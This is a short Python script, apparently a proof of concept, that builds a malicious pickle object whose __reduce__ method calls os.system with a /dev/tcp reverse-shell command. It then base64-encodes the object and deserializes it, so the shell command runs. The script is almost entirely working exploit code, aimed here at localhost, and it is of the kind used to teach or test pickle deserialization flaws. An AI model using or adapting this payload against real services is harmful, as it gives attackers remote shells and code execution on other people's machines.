#!/usr/bin/env python3
import sys
import base64
import pickle
import os
class GetShell(object):
    def __reduce__(self):
        return (os.system,('/bin/sh </dev/tcp/localhost/1234 >&0 2>&0',))

tmp= pickle.dumps(GetShell())
data = base64.urlsafe_b64encode(tmp)

args = sys.argv
if len(args) != 2:
    print('第一引数が足りません')
try:
    data = base64.urlsafe_b64decode(data)
    deserialized = pickle.loads(data)
    print('deserialized: {0}'.format(deserialized))
except:
    print('Failed to deserialize')